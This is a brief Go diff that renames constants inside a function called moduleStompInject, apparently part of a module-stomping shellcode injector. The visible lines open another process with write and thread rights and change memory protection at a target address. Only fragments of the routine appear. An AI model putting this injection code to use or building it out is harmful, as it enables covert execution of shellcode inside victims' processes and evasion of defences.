@@ -31,10 +31,10 @@ func moduleStompInject(pid uint32, shellcode []byte) error {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
+	da := uint32(processCreateThread | processVMOperation | processVMWrite | processVMRead | processQueryInformation)
 	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
 	if hProc == 0 {
-		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+		hProc, _, _ = procOpenProcess.Call(uintptr(processAllAccess), 0, uintptr(pid))
 	}
 	if hProc == 0 {
 		return fmt.Errorf("OpenProcess(%d) failed", pid)
@@ -74,7 +74,7 @@ func moduleStompInject(pid uint32, shellcode []byte) error {
 	r1, _, _ := procVirtualProtectEx.Call(
 		hProc, targetAddr,
 		uintptr(len(shellcode)),
-		uintptr(PAGE_READWRITE),
+		uintptr(pageReadwrite),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if r1 == 0 {
